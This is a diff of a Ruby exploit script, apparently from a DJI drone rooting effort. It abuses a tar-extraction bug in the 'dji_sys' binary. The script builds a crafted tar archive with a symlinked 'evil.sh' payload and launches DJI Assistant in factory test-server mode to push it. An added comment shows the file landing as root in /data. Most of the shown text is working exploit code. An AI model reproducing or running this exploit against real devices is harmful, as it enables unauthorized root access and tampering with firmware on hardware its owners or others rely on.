@@ -93,10 +93,6 @@ end
 
 trap 'INT' do server.shutdown end
 
-# This is not working... fix it... 
-# Debug with:
-# while true; do adb pull /ftp/upgrade/data_copy.bin data_copy.bin; done
-
 # The bug being exploited is in the 'dji_sys' binary
 #  busybox strings /system/bin/dji_sys | grep "tar "
 #  busybox tar -xvf %s -C %s
@@ -117,6 +113,9 @@ adbensh =
 File.open("symlink/evil.sh", 'w') {|f| f.write(adbensh) }
 system("tar --append -f bug.tar symlink/evil.sh")
 system("tar --list -f bug.tar")
+
+# root@wm220_dz_ap0002_v1:/ # ls -al /data/evil.sh                               
+# -rw-r--r-- root     20             39 2017-07-01 23:50 evil.sh
 
 pid = spawn("/Applications/Assistant_1_1_0.app/Contents/MacOS/Assistant --test_server --factory")
 Process.detach(pid)
